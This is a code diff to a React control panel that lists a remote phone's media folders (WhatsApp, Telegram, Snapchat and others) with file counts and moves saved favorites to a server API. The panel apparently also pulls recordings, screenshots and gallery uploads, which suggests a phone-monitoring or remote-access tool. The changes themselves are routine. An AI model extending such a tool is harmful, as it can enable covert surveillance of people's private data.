@@ -858,7 +858,10 @@
     const [advFolders, setAdvFolders] = useState([]);
     const dev = stats || {};
 
-    const FOLDERS = ['camera','downloads','screenshots','whatsapp','telegram','instagram','facebook','twitter','snapchat','tiktok','saved'];
+    const FALLBACK_FOLDERS = ['camera','downloads','screenshots','whatsapp','telegram','instagram','facebook','twitter','snapchat','tiktok','saved'];
+    const deviceFolders = (dev.folders && dev.folders.length > 0)
+      ? dev.folders.map(f => f.name)
+      : FALLBACK_FOLDERS;
 
     const isWorking = progress && (progress.status === 'scanning' || progress.status === 'uploading');
 
@@ -926,7 +929,10 @@
             <div style={{display:'flex', gap:6, marginBottom:8, flexWrap:'wrap'}}>
               <select value={folder} onChange={e=>setFolder(e.target.value)}
                 style={{flex:1, minWidth:0, height:34, padding:'0 8px', fontSize:12, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}>
-                {FOLDERS.map(f => <option key={f} value={f}>{f}</option>)}
+                {deviceFolders.map(f => {
+                  const info = dev.folders && dev.folders.find(x=>x.name===f);
+                  return <option key={f} value={f}>{f}{info ? ` (${info.count})` : ''}</option>;
+                })}
               </select>
               <select value={folderCount} onChange={e=>setFolderCount(Number(e.target.value))}
                 style={{height:34, padding:'0 8px', fontSize:12, borderRadius:8, border:'1.5px solid #E2E8F0', background:'#FFF'}}>
@@ -970,7 +976,7 @@
                 {/* Folder multi-select */}
                 <div style={{fontSize:11, fontWeight:700, color:'#718096', marginBottom:4}}>Folders (select multiple, or none for all)</div>
                 <div style={{display:'flex', flexWrap:'wrap', gap:4, marginBottom:10}}>
-                  {FOLDERS.map(f => {
+                  {deviceFolders.map(f => {
                     const sel = advFolders.includes(f);
                     return (
                       <button key={f} onClick={()=>toggleAdvFolder(f)} style={{
@@ -1083,12 +1089,24 @@
     const [audioTesting,    setAudioTesting]    = useState({});
     const [apkInfo,         setApkInfo]         = useState(null);
     const [apkUploading,    setApkUploading]    = useState(false);
-    const [favorites,       setFavorites]       = useState(() => {
-      try { return JSON.parse(localStorage.getItem('bm_favorites') || '{}'); } catch { return {}; }
-    });
-    useEffect(() => {
-      try { localStorage.setItem('bm_favorites', JSON.stringify(favorites)); } catch {}
-    }, [favorites]);
+    const [favorites,       setFavorites]       = useState({});
+    const fetchFavorites = useCallback(async () => {
+      try { setFavorites(await (await fetch('/api/favorites')).json()); } catch {}
+    }, []);
+    const addFav = async (kind, deviceId, filename) => {
+      await fetch('/api/favorites', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ kind, deviceId, filename }),
+      });
+      fetchFavorites();
+    };
+    const removeFav = async (kind, deviceId, filename) => {
+      await fetch('/api/favorites', {
+        method:'DELETE', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ kind, deviceId, filename }),
+      });
+      fetchFavorites();
+    };
     const [passPrompt, setPassPrompt] = useState(null);
     const askPassword = (message) => new Promise(resolve => {
       setPassPrompt({
@@ -1096,22 +1114,6 @@
         onOk:     () => { setPassPrompt(null); resolve(true); },
         onCancel: () => { setPassPrompt(null); resolve(false); },
       });
-    });
-
-    const isFav = (kind, deviceId, filename) =>
-      !!(favorites[kind]?.[deviceId]?.includes(filename));
-    const addFav = (kind, deviceId, filename) => setFavorites(p => {
-      const k = { ...(p[kind] || {}) };
-      const arr = new Set(k[deviceId] || []);
-      arr.add(filename);
-      k[deviceId] = [...arr];
-      return { ...p, [kind]: k };
-    });
-    const removeFav = (kind, deviceId, filename) => setFavorites(p => {
-      const k = { ...(p[kind] || {}) };
-      k[deviceId] = (k[deviceId] || []).filter(f => f !== filename);
-      if (!k[deviceId].length) delete k[deviceId];
-      return { ...p, [kind]: k };
     });
 
     const socketRef   = useRef(null);
@@ -1290,8 +1292,9 @@
       fetchShot();
       fetchGallery();
       fetchApk();
+      fetchFavorites();
       return () => { socket.disconnect(); Object.values(timerRefs.current).forEach(clearInterval); };
-    }, [fetchRec, fetchShot, fetchGallery, fetchApk, showToast]);
+    }, [fetchRec, fetchShot, fetchGallery, fetchApk, fetchFavorites, showToast]);
 
     /* Timer helpers */
     const startTimer = useCallback((id, sec) => {
